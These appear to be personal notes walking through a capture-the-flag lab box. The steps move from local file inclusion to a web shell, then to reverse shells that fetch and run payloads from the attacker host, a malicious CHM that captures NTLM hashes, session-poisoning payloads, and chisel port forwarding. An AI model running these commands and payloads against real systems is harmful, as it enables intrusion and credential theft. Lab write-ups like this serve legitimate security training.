nmap shows ports 80, smb set, rpc open
smb locked down
Webpage-
/services has a ?language option, which gets a file called blog_en.php
Possibly LFI.

test for LFI. We know it is windows. In windows, usually, the web files are at c:\inetpub\wwwroot. So, we use directory traversal, go levels up and try to grab c:\windows\win.ini. Capture the packet send it to repeater, modify the 
?lang=../../../windows/win.ini - Nope
?lang=/../../../winsows/win.ini - Nope
?lang=windows/win.ini - Nope
?lang=/windows/win.ini -- YES, we have LFI!

But we need a way for it to send us a shell.
We can et RCE from LFI in a few ways
log poisoning, upload file, session poisoning, php wrapper

Note - phpwrapper works like so
?lang=php://filter/convert.base64-encode/resource=index.php - for linux, but base64 encode it

---
For log poisoning, we tried files in /inetpub/logs/Logfiles but cold guess the name of the access log.
There was no upload file page.

We try RFI, but that wasnt working. so tried to host our own smb server, so it is mounted, and hence it is effectively LFI.
`smpacket-smbserver -smb2support mine $(pwd)`
from burp, ?lang=\\10.10.14.34\mine\test.txt
And we found we can setup a php reverse shell from there, using the 
<?php echo shell_exec($_GET["cmd"]); ?>
Once this was placed, the command gave us an output.
?lang=\\10.10.14.34\mine\test.txt&cmd=whoami

So, time to put a reverse shell there
Tried to put a reverse shell one liner base-64 ecoded, with powershell -enc b64string dint work
Next is IEX
`powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.34:8990/rshell.ps1')`
Note - This gives a shitty reverse shell. to get a better one,
?lang=\\10.10.14.34\mine\nc.exe -nv 10.10.14.34 1234 -e powershell

---
We get a password in /usr/db.php, 36mEAhz/B8xQ~2VM
`$cred = New-Object System.Management.Automation.PSCredential ("Sniper\Chris", (ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force))`

`Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {whoami}`

It works! So we use the same smb share and run the nc.exe with Chris creds to giv ourselves elevated user.

`Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {\\10.10.14.34\mine\nc.exe -nv 10.10.14.34 9001 -e powershell}`
Chris!

---
We find a .chm file in Chris's Documents file
In order to exploit this, we can create a new CHM file containing a UNC link, that will trigger a connection to our server on opening. This will allow us to steal the admins NetNTLMv2 hashes. Consider the following HTML code
```html instructions.html
<html>
	<body>
		<img scr=\\10.10.14.34\mine\abc.png />
	</body>
</html>
```
We will place the above code into instructions.html , and use the HTML Help Workshop on a Windows machine to compile the code.
do the thing, and place our newly create instructions.html into the instructions.chm.
Copy and place the new CHM into C:\Docs in the victim machine. The expectation is, the Administrator tries to open this, and it dumps his password to us on responder.
`responder -I tun0`
And we get a hash!
`hashcat -m 5600 --force hash.txt rockyou.txt`
we see creds, butterfly!#1

Now, again follow the secure string thing, and run nc.exe -nv ip port -e powershell
root!

OR

using Nishaang's Out-CHM.ps1 script.
On a Windows vm,
`.\Out-CHM.ps1 -Payload "C:\Users\Chris\Downloads\nc.exe -nv 10.10.14.34 9009 -e powershell" -HHCPath "C:\Program Files (x86)\HTML Help Workshop`

---
---
---
Using Session poisoning -
The oage allows new users to register. when we register new user, in windows, php stores a file for that phpsession id in the file C:\Windows\Temp\sess_<session_id cookie value>
Since we can visit the location using the LFI vulnerability, we can create a user with a name something like `<php echo shell_exec($_GET["cmd"]); ?>`
Then login as that user, grab the session_id and visit the \Temp\sess_ to get rce

However, there are certain bad chars that php doesnt allow to be used in usernames.
To find those out, we write a python script.
```python
import string
import requests
import secrets

url_login = 'http://10.10.10.151/user/login.php'
url_reg = 'htp://10.10.10.151/user/registration.php'

characters = string.punctuation
#this generates a strnig of special charecters, excluding space

for chare in characters:
	random = secrets.token_hex(10) #10 random hex chars
	#now we intercept a registration req and look at the data it sends
	#grab the parameters from there, and modify it here
	data = {'email':f"{random}@test.com", 'username':chare, 'password':'a', 'submit':''}
	r = requests.post(url = url_reg, data=data)
	
	#now, do the same thing and use the username
	data = {'username':chare, 'password':'a', 'submit':''}
	r = requests.post(url = url_login, data=data)
	
	#find a phrase in the response of the login, that is unique to failure
	if "incorrect" in r:
		print(chare)

```
From this, we see a bunch of them are bad chars, including $
So we need a payload that doesnt use it, and so we come up with <?=`whoami`?>
and refine it to <?=`powershell /enc b64cmdhash`?>
To generate the base64 payload,
`echo whoami | iconv -t utf-16le | base64 -w 0` on kali

We'll mod the payload to first download nc.exe to machine, and another to execute it.
`echo wget http://10.10.14.34/nc.exe -O C:\Windows\Temp\netc.exe | iconv -t utf-16le | base64 -w 0` on kali, and host python server
Create an account with the username <?=`powershell /enc b64cmdhash`?>
Login, get sess cookie, LFI to Temp\sess_sessID
We see the python server gets a hit.

Now, to execute it,
`echo c:\Windows\Temp\netc.exe -nv 10.10.14.34 1234 -e powershell | iconv -t utf-16le | base64 -w 0` on kali, while listening on port 1234
create account, login, grab sess id, lfi, and we get a hit

---
To access this using evil-winrm, we need port 5985 up and running on windows.
That port, however, is only listening on localhost, and Chris is a member of the group for powershell remoting.
So we need to port forward without ssh
upload chisel to windows
`wget 10.10.14.34/chisel.exe -O chisel.exe`
`./chisel server -p 8000 -reverse`

`netstat -an` on windows, find the port 5985, and any other you might want to forward
`.\chisel.exe client 10.10.14.34:8000 R:5985:127.0.0.1:5985 R:3306:127.0.0.1:3306`

`mysql -h 127.0.0.1 -u dbuser -D sniper -p`
